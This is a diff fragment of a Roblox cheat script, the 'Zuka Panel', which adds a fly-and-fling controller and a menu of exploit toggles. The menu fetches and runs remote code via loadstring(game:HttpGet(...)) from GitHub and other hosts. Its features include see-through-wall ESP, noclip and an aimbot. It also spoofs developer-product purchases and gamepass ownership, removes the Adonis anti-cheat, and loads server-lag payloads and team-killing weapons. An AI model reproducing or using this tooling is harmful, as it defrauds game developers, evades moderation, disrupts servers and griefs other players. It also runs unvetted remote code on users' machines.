+    	Humanoid:EquipTool(Tool)
+    	repeat task.wait() until Character:FindFirstChildWhichIsA("Tool")
+    	Humanoid:UnequipTools()
+    end
+    repeat
+        Player:Move(Vector3.new(1/0))
+        task.wait()
+    until Humanoid.Health == 0
+    repeat task.wait() until not Character:FindFirstChildWhichIsA("BasePart")
+    Humanoid:EquipTool(Tool)
+    Camera.CameraSubject = Handle
+    Handle.Name = "HumanoidRootPart"
+    Handle.Parent = Character
+    local Control = function()
+        local Speed = 0
+        local Keys = {
+            Q = false,
+            E = false,
+            W = false,
+            A = false,
+            S = false,
+            D = false
+        }
+        local BodyPosition = Instance.new("BodyPosition", Handle)
+        local BodyGyro = Instance.new("BodyGyro", Handle)
+        BodyPosition.P = MovementPower * 1000
+        BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        BodyPosition.Position = Handle.Position
+        BodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+        BodyGyro.CFrame = Handle.CFrame
+        UserInputService.InputBegan:Connect(function(Input, Typing)
+            if not Typing then
+                if not Keys[Input.KeyCode.Name] then
+                    Keys[Input.KeyCode.Name] = true
+                end
+            end
+        end)
+        UserInputService.InputEnded:Connect(function(Input, Typing)
+            if not Typing then
+                if Keys[Input.KeyCode.Name] then
+                    Keys[Input.KeyCode.Name] = false
+                end
+            end
+        end)
+        local ResetConnection; ResetConnection = ResetBind.Event:Connect(function()
+            if BodyPosition and BodyGyro then
+                BodyPosition:Destroy()
+                BodyGyro:Destroy()
+            end
+            replicatesignal(Player.ConnectDiedSignalBackend)
+        end)
+        task.spawn(function()
+            local i = 0
+            while BodyPosition and BodyGyro do
+                local New = BodyGyro.CFrame - BodyGyro.CFrame.p + BodyPosition.Position
+                if not (Keys.Q and Keys.E and Keys.W and Keys.A and Keys.S and Keys.D) then
+                    Speed = MaxSpeed * .75
+                end
+                if Keys.Q then
+                    New = New * CFrame.new(0, -Speed / 2, 0)
+                end
+                if Keys.E then
+                    New = New * CFrame.new(0, Speed / 2, 0)
+                end
+                if Keys.W then
+                    New = New + Camera.CoordinateFrame.LookVector * Speed
+                    Speed += .01
+                end
+                if Keys.A then
+                    New = New * CFrame.new(-Speed, 0, 0)
+                    Speed += .01
+                end
+                if Keys.S then
+                    New = New - Camera.CoordinateFrame.LookVector * Speed
+                    Speed += .01
+                end
+                if Keys.D then
+                    New = New * CFrame.new(Speed, 0, 0)
+                    Speed += .01
+                end
+                if Speed > MaxSpeed then
+                    Speed = MaxSpeed
+                end
+                BodyPosition.position = New.p
+                if Keys.W then
+                    BodyGyro.CFrame = Camera.CoordinateFrame * CFrame.Angles(-math.rad(Speed * 5), 0, 0)
+                elseif Keys.S then
+                    BodyGyro.CFrame = Camera.CoordinateFrame * CFrame.Angles(math.rad(Speed * 5), 0, 0)
+                else
+                    i += .05
+                    BodyGyro.CFrame = Camera.CoordinateFrame
+                    BodyPosition.Position = New.p + Vector3.new(0, math.sin(i) / 40, 0)
+                end
+                task.wait()
+            end
+        end)
+        local FlingDebounce = false
+        UserInputService.InputBegan:Connect(function(Key, Typing)
+            if not Typing and Key.KeyCode == Enum.KeyCode[FlingHotkey] then
+                if not FlingDebounce then
+                    FlingDebounce = true
+                else
+                    FlingDebounce = false
+                end
+            end
+        end)
+        task.spawn(function()
+            while Player.Character == Character do
+                if FlingDebounce then
+                    local Velocity = Handle.Velocity
+                    Handle.Velocity = Velocity + (Handle.CFrame.LookVector * FlingPower) + Vector3.new(0, FlingPower, 0)
+                    RunService.RenderStepped:wait()
+                    Handle.Velocity = Velocity
+                end
+                task.wait()
+            end
+        end)
+        StarterGui:SetCore("ResetButtonCallback", ResetBind)
+        Player.CharacterAdded:wait()
+        StarterGui:SetCore("ResetButtonCallback", true)
+    end
+    Control()
+end)
 RegisterCommand({
     Name = "sendtothevoid",
     Aliases = {"voidkill"},
@@ -41279,4 +43604,144 @@ task.spawn(function()
     task.wait(1)
     Modules.AdminOrb:Spawn()
 end)
-DoNotif("We're So back. The Best Underground Panel.")
+DoNotif("We're So back.")
+task.spawn(function()
+    local Luna
+    local ok, err = pcall(function()
+        Luna = loadstring(game:HttpGet(
+            "https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/Luna.lua", true
+        ))()
+    end)
+    if not ok or not Luna then
+        warn("[ZukaPanel/LunaUI] Luna failed to load:", tostring(err))
+        return
+    end
+    local Window = Luna:CreateWindow({
+        Name           = "Zuka Panel",
+        Subtitle       = "by OverZuka",
+        LogoID         = "rbxassetid://7243158473",
+        LoadingEnabled = false,
+        ConfigSettings = { ConfigFolder = "ZukaPanelLuna" },
+        KeySystem      = false,
+    })
+    local Movement = Window:CreateTab({ Name = "Movement", Icon = "directions_run", ImageSource = "Material", ShowTitle = true })
+    Movement:CreateToggle({ Name = "Fly",           Description = "Toggle client-sided fly",       CurrentValue = false, Callback = function() Modules.Fly:Toggle() end }, "luna_fly")
+    Movement:CreateToggle({ Name = "NoClip",        Description = "Walk through walls",             CurrentValue = false, Callback = function() Modules.NoClip:Toggle() end }, "luna_noclip")
+    Movement:CreateToggle({ Name = "Infinite Jump", Description = "Jump repeatedly mid-air",        CurrentValue = false, Callback = function(v) if v then Modules.InfiniteJump:Enable() else Modules.InfiniteJump:Disable() end end }, "luna_infjump")
+    Movement:CreateToggle({ Name = "Anti Reset",    Description = "Prevent death and void falls",   CurrentValue = false, Callback = function() Modules.AntiReset:Toggle() end }, "luna_antireset")
+    Movement:CreateToggle({ Name = "Anti Sit",      Description = "Prevent being force-sat",        CurrentValue = false, Callback = function() Modules.AntiSit:Toggle() end }, "luna_antisit")
+    Movement:CreateDivider()
+    Movement:CreateSlider({ Name = "Walk Speed", Description = "Default: 16", Range = {0,500}, Increment = 1, CurrentValue = 16, Suffix = "studs/s",
+        Callback = function(v)
+            local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if h then h.WalkSpeed = v end
+            Modules.WalkSpeed.State.CurrentSpeed = v
+        end }, "luna_ws")
+    Movement:CreateSlider({ Name = "Fly Speed", Description = "Velocity while flying", Range = {10,500}, Increment = 5, CurrentValue = 60, Suffix = "",
+        Callback = function(v) Modules.Fly:SetSpeed(v) end }, "luna_flyspd")
+    Movement:CreateSlider({ Name = "Gravity", Description = "Default: 196  |  0 = restore", Range = {0,400}, Increment = 5, CurrentValue = 196, Suffix = "",
+        Callback = function(v) if v <= 0 then Modules.Gravity:Disable() else Modules.Gravity:Enable(v) end end }, "luna_grav")
+    local Visual = Window:CreateTab({ Name = "Visual", Icon = "visibility", ImageSource = "Material", ShowTitle = true })
+    Visual:CreateToggle({ Name = "Player ESP",     Description = "Highlight players through walls", CurrentValue = false, Callback = function() Modules.ESP:Toggle("players") end }, "luna_esp")
+    Visual:CreateToggle({ Name = "Chams",          Description = "See characters through walls",    CurrentValue = false, Callback = function() Modules.Chams:Toggle() end }, "luna_chams")
+    Visual:CreateToggle({ Name = "FullBright",     Description = "Max ambient, remove shadows",     CurrentValue = false, Callback = function(v) if v then Modules.FullBright:Enable() else Modules.FullBright:Disable() end end }, "luna_fb")
+    Visual:CreateToggle({ Name = "No Fog",         Description = "Remove client-sided fog",         CurrentValue = false, Callback = function() Modules.NoFog:Toggle() end }, "luna_nofog")
+    Visual:CreateToggle({ Name = "Lighting Lock",  Description = "Prevent game changing lighting",  CurrentValue = false, Callback = function() Modules.LightingLock:Toggle() end }, "luna_ll")
+    Visual:CreateToggle({ Name = "FPS Meter",      Description = "Show FPS counter on screen",      CurrentValue = false, Callback = function() Modules.FpsMeter:Toggle() end }, "luna_fps")
+    Visual:CreateDivider()
+    Visual:CreateSlider({ Name = "FOV Lock", Description = "Lock camera FOV  |  0 = reset", Range = {0,120}, Increment = 1, CurrentValue = 70, Suffix = "°",
+        Callback = function(v)
+            local cam = workspace.CurrentCamera
+            if not cam then return end
+            if v == 0 then
+                Modules.FovChanger.State.IsEnabled = false
+                if Modules.FovChanger.State.Connection then Modules.FovChanger.State.Connection:Disconnect() Modules.FovChanger.State.Connection = nil end
+                cam.FieldOfView = Modules.FovChanger.State.DefaultFov
+            else
+                Modules.FovChanger.State.TargetFov = v
+                if not Modules.FovChanger.State.Connection then
+                    Modules.FovChanger.State.Connection = game:GetService("RunService").RenderStepped:Connect(function()
+                        if cam and Modules.FovChanger.State.IsEnabled then cam.FieldOfView = Modules.FovChanger.State.TargetFov end
+                    end)
+                end
+                Modules.FovChanger.State.IsEnabled = true
+            end
+        end }, "luna_fov")
+    local Utility = Window:CreateTab({ Name = "Utility", Icon = "build", ImageSource = "Material", ShowTitle = true })
+    Utility:CreateToggle({ Name = "Anti AFK",         Description = "Prevent idle disconnect",             CurrentValue = false, Callback = function() Modules.InternalAntiAfk:Toggle() end }, "luna_afk")
+    Utility:CreateToggle({ Name = "Fling Protection", Description = "Prevent being flung",                 CurrentValue = false, Callback = function() Modules.FlingProtection:Toggle() end }, "luna_fp")
+    Utility:CreateToggle({ Name = "Anti Attach",      Description = "Counter players latching onto you",   CurrentValue = false, Callback = function() Modules.AntiAttach:Toggle() end }, "luna_aa")
+    Utility:CreateToggle({ Name = "Anti Force-TP",    Description = "Block server CFrame teleports",       CurrentValue = false, Callback = function() Modules.AntiCFrameTeleport:Toggle() end }, "luna_atp")
+    Utility:CreateToggle({ Name = "Bypass Dev Products", Description = "Spoof purchase as completed",      CurrentValue = false, Callback = function(v) Modules.BypassDevProduct.State.Enabled = v DoNotif("Bypass DevProduct: "..(v and "ON" or "OFF"), 2) end }, "luna_bdp")
+    Utility:CreateToggle({ Name = "Bypass Gamepass",  Description = "Spoof UserOwnsGamePassAsync",         CurrentValue = false, Callback = function(v) Modules.BypassGamepass.State.Enabled = v DoNotif("Bypass Gamepass: "..(v and "ON" or "OFF"), 2) end }, "luna_bgp")
+    Utility:CreateToggle({ Name = "Respawn At Death", Description = "TP to death pos on respawn",          CurrentValue = false, Callback = function() Modules.RespawnAtDeath.Toggle() end }, "luna_rad")
+    Utility:CreateDivider()
+    Utility:CreateButton({ Name = "Open Command Bar", Description = "Toggle the Zuka command bar",  Callback = function() if Modules.CommandBar and Modules.CommandBar.Toggle then Modules.CommandBar:Toggle() end end })
+    Utility:CreateButton({ Name = "Command List",     Description = "View all available commands",  Callback = function() if Modules.CommandList and Modules.CommandList.Toggle then Modules.CommandList:Toggle() end end })
+    Utility:CreateButton({ Name = "Rejoin Server",    Description = "Rejoin current server",        Callback = function() if Modules.RejoinServer and Modules.RejoinServer.Rejoin then Modules.RejoinServer:Rejoin() end end })
+    local LS = Window:CreateTab({ Name = "Loadstrings", Icon = "code", ImageSource = "Material", ShowTitle = true })
+    local function ls(url, msg) pcall(loadstringCmd, url, msg) end
+    LS:CreateSection("Tools & Utilities")
+    LS:CreateButton({ Name = "Zex / Dex+",          Description = "Updated Dex Explorer",                    Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/Zex.lua", "Loading Zex..") end })
+    LS:CreateButton({ Name = "Ghidra",               Description = "HEX Overseer — better than all",         Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/HEXOverseer.lua", "Loading..") end })
+    LS:CreateButton({ Name = "Rem",                  Description = "In-game exploit creation kit",           Callback = function() ls("https://e-vil.com/anbu/rem.lua", "Loading Rem.") end })
+    LS:CreateButton({ Name = "Teleporter / Game Finder", Description = "Game Universe UI",                   Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/GameFinder.lua", "stolen from nameless-admin") end })
+    LS:CreateButton({ Name = "Improved Btools",      Description = "Upgraded GUI for btools",                Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/buildtools.lua", "Loading Revamped Btools Gui") end })
+    LS:CreateButton({ Name = "Stats Lock",           Description = "Edit and lock your properties",          Callback = function() ls("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/statlock.lua", "Loading Stats..") end })
+    LS:CreateButton({ Name = "Copy Console",         Description = "Copy errors from the console",           Callback = function() ls("https://raw.githubusercontent.com/scriptlisenbe-stack/luaprojectse3/refs/heads/main/consolecopy.lua", "Copy Console Activated.") end })
+    LS:CreateButton({ Name = "No Anim",              Description = "Pause/remove all player animations",     Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/animationremover.lua", "Loading..") end })
+    LS:CreateButton({ Name = "Zuka Hub",             Description = "Load the Zuka Hub",                      Callback = function() ls("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/ZukaHub.lua", "Loading Zuka's Hub...") end })
+    LS:CreateButton({ Name = "ConvertR6",            Description = "R15 → R6 converter (WIP)",               Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/r15tor6.lua", "Loading, Wait a sec.") end })
+    LS:CreateButton({ Name = "Line of Sight Logger", Description = "Log players looking at you",             Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/LineOfSightLogger.lua", "Loading...") end })
+    LS:CreateButton({ Name = "Z Spy",                Description = "Simple spy rework — beta",               Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/executor_scripts/SimpleSpyRework.lua", "in beta...") end })
+    LS:CreateButton({ Name = "Creepy Anim GUI",      Description = "Uncanny animation GUI",                  Callback = function() ls("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/uncannyanim.lua", "Loaded GUI") end })
+    LS:CreateButton({ Name = "Walk Void",            Description = "Stop falling into the void",             Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/WalkVoid.lua", "You are now safe from falling into the void.") end })
+    LS:CreateButton({ Name = "Reach Fix",            Description = "Make equipped tool invisible w/ reach",  Callback = function() ls("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/InvisibleEquippedTool.lua", "Fixed") end })
+    LS:CreateButton({ Name = "Wall Walk (WIP)",      Description = "Work in progress",                       Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/WorkINPro.lua", "Anti Gay Shield Activated.") end })
+    LS:CreateButton({ Name = "Remove Forcefield",    Description = "Client-side forcefield remover",         Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/removeforcefield.txt", "Loading..") end })
+    LS:CreateButton({ Name = "Remove Adonis",        Description = "Says no to Adonis",                      Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/ByeByeAdonis.lua", "Loading..") end })
+    LS:CreateSection("Combat & Weapons")
+    LS:CreateButton({ Name = "Auto Fling",           Description = "Pwned flinger",                          Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/Ultimatefling.lua", "Loaded!") end })
+    LS:CreateButton({ Name = "Touch Fling GUI",      Description = "Simple touch fling GUI",                 Callback = function() ls("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/SimpleTouchFlingGui.lua", "Loaded") end })
+    LS:CreateButton({ Name = "Sword Bot",            Description = "Auto sword fighter — use E and R",       Callback = function() ls("https://raw.githubusercontent.com/bloxtech1/luaprojects2/refs/heads/main/swordnpc", "Bot loaded.") end })
+    LS:CreateButton({ Name = "Poison Gun",           Description = "Universal weapon patcher",               Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/universalweaponpatcher.lua", "Loading GUI..") end })
+    LS:CreateButton({ Name = "Patched Guns",         Description = "Avoid idle kick while using guns",       Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/PatchedGuns.lua", "Guns Patched.") end })
+    LS:CreateButton({ Name = "Fling Gun",            Description = "Patch gun — fling version",              Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/patchgunflingversion.lua", "Loading, Wait a sec.") end })
+    LS:CreateButton({ Name = "CSGO Bhop",            Description = "Bhop movement",                          Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/phoon.lua", "Loading") end })
+    LS:CreateButton({ Name = "Luna Aimbot (WIP)",    Description = "GamingChair aimbot — WIP",               Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/GamingChair.lua", "Loaded") end })
+    LS:CreateButton({ Name = "Doom Hammer",          Description = "For dumb bossfights",                    Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/doomshammer.lua", "Loading..") end })
+    LS:CreateButton({ Name = "TP to Swords",         Description = "Sword grabber for bossfight games",      Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/SwordGrabberBossfightGame.lua", "Loading..") end })
+    LS:CreateButton({ Name = "Lag Server",           Description = "Server payload (WIP)",                   Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/gamelagger.lua", "Loading..") end })
+    LS:CreateSection("Game Specific")
+    LS:CreateSection("► Zombie Game")
+    LS:CreateButton({ Name = "ZG — Sniper",          Description = "Zombie Game",                            Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/sniperZG.lua", "Loading..") end })
+    LS:CreateButton({ Name = "ZG — Shotgun",         Description = "Zombie Game",                            Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/ShotgunMinigunScriptWorking.lua", "Loading..") end })
+    LS:CreateButton({ Name = "ZG — No Acid Rain",    Description = "Zombie Game",                            Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/AntiAcidRainLag.lua", "Loading...") end })
+    LS:CreateButton({ Name = "ZG — No Cooldowns",    Description = "Zombie Game",                            Callback = function() ls("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/NocooldownsZombieUpd3.txt", "Loading Cooldownremover...") end })
+    LS:CreateButton({ Name = "ZG — Shovel Anim",     Description = "Zombie Game",                            Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/ShovelAnimation.lua", "Loading Shovel.") end })
+    LS:CreateButton({ Name = "ZG — Box ESP",         Description = "Zombie Game basic ESP",                  Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/BasicEsp.lua", "Loading Box esp") end })
+    LS:CreateButton({ Name = "ZG — Melee x2",        Description = "Zombie Infection Game",                  Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/MeleeDamagex2.lua", "Loading..") end })
+    LS:CreateSection("► Protect The House")
+    LS:CreateButton({ Name = "PTHM — Gun Lagger",    Description = "Protect The House from Monsters",        Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/Lagger.lua", "Loading..") end })
+    LS:CreateButton({ Name = "PTHM — Gun Lagger 2",  Description = "Protect The House — machine gun",        Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/machinegun.lua", "Loading..") end })
+    LS:CreateButton({ Name = "PTHM — P-Launcher",    Description = "Protect The House — projectile lagger",  Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/GameLaggerPlauncher.lua", "Loading Modification") end })
+    LS:CreateButton({ Name = "PTHM — Pumpkin",       Description = "Protect The House — rapid fire pumpkin", Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/RAPIDFIREPumpkinlauncher.lua", "Loading") end })
+    LS:CreateSection("► Backrooms")
+    LS:CreateButton({ Name = "Plasma Sniper",        Description = "Backrooms",                              Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/plasmasniper.lua", "Loaded") end })
+    LS:CreateButton({ Name = "UMP Team Killer",      Description = "Backrooms",                              Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/UMPteamkiller.lua", "Loaded") end })
+    LS:CreateButton({ Name = "Fling Gun (Backrooms)", Description = "Backrooms",                             Callback = function() ls("https://raw.githubusercontent.com/zukatech1/Main-Repo/refs/heads/main/patchgunflingversion.lua", "Loading, Wait a sec.") end })
+    LS:CreateSection("► Other Games")
+    LS:CreateButton({ Name = "WOS — No Dash CD",     Description = "World of Stands — removes dash cooldown", Callback = function() ls("https://raw.githubusercontent.com/zukatech1/ZukaTechPanel/refs/heads/main/WOS.lua", "Loading, Wait a sec.") end })
+    LS:CreateButton({ Name = "Z Fucker",             Description = "ZL series",                              Callback = function() ls("https://raw.githubusercontent.com/osukfcdays/zlfucker/refs/heads/main/main.luau", "Loading, Wait a sec.") end })
+    local Settings = Window:CreateTab({ Name = "Settings", Icon = "settings", ImageSource = "Material", ShowTitle = true })
+    Settings:CreateInput({ Name = "Command Prefix", Description = "Change your prefix  (default: ;)",
+        PlaceholderText = "Single char e.g.  ;  !  .", CurrentValue = Prefix or ";",
+        Numeric = false, MaxCharacters = 1, Enter = true,
+        Callback = function(Text)
+            if Text and #Text == 1 then getgenv().Prefix = Text DoNotif("Prefix changed to: "..Text, 2)
+            else DoNotif("Prefix must be exactly one character.", 3) end
+        end }, "luna_prefix")
+    Settings:CreateButton({ Name = "Test Notification", Description = "Send a test DoNotif",
+        Callback = function() DoNotif("Luna UI is working!", 3) end })
+    DoNotif("Libui loaded.", 2)
+end)
